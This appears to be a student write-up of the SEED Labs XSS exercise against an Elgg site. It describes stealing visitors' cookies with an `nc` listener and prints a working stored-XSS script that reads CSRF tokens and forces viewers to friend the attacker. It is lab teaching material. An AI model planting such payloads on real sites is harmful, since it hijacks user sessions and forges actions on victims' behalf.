# XSS 

## Preparation

In this task, after opening up the HTTP Header Live, we can see multiple requests and their response.

![""](http_header_live.png)



## Task 1

After login in with the user samy, we can see our profile.

![""](task1_1.png)

Now, in the edit profile page, we can change the about us section, and place our script inside

![""](task1_2.png)


Now, everytime we check our profile, we can see the XSS pop up.

![""](task1_3.png)


If we login with another count, like alice, and check the profile of samy, we can see that the script also makes the pop up appear.

![""](task1_4.png)

![""](task1_5.png)



## Task 2

All we need to do is repeat the steps of the previous task, but this time place the new script.


![""](task2_1.png)


![""](task2_2.png)


## Task 3

Taking the same initial steps as before (login to sammy account and go to the edit profile page), we can write the script to send the cookies of the user which is looking at our profile to us.

![""](task3_1.png)

Now, if we login with alice, and run `nc -lknv 5555` in order to listen to everything that is transmited in the port 5555, when alice checks our profile, we can receive their cookies

![""](task3_2.png)

So, everytime someone check our profile, we will receive their cookies.
We can also use HTTP Header Live in order to check the request made by the browser

![""](task3_3.png)





## Task 4

First of all we need to understand how to the request to add a friend is made.
We can do this by making any friend request, and use http live to see how it was made.

In this case, we made a request from alice's account, and tried to add charlie as friend:

![""](task4_1.png)


We have 3 query parameters:

- **friend** which is the id of the friend you wish to add

- **__elgg_ts** and **__elgg_token** which are both used as countermeasures against CSRF attacks. We need to have these parameters, otherwise, our request will just be discarded. So, we need to ask javascript to get these values during runtime, in order for them to be valid (That's what is done in the script below).

```
<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	
	//Construct the HTTP request to add Samy as a friend.
	var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
	}
</script>

```

After preparing our script, we can write it on our profile just like we did with the previous scripts.


![""](task4_2.png)

Now, in order to test our script, we can login into alice's account, and check her friends.


![""](task4_3.png)

As we can see in the image above, alice has no friends (for now).

Now, let's search for Sammy's profile in the members page, and check his profile:

![""](task4_4.png)

![""](task4_5.png)

Now, we can go to alice's friends page, and now we can see that sammy was added as friend, meaning that our script has worked.

![""](task4_6.png)


Using the http live we can even check how our request was made:

![""](task4_7.png)












 












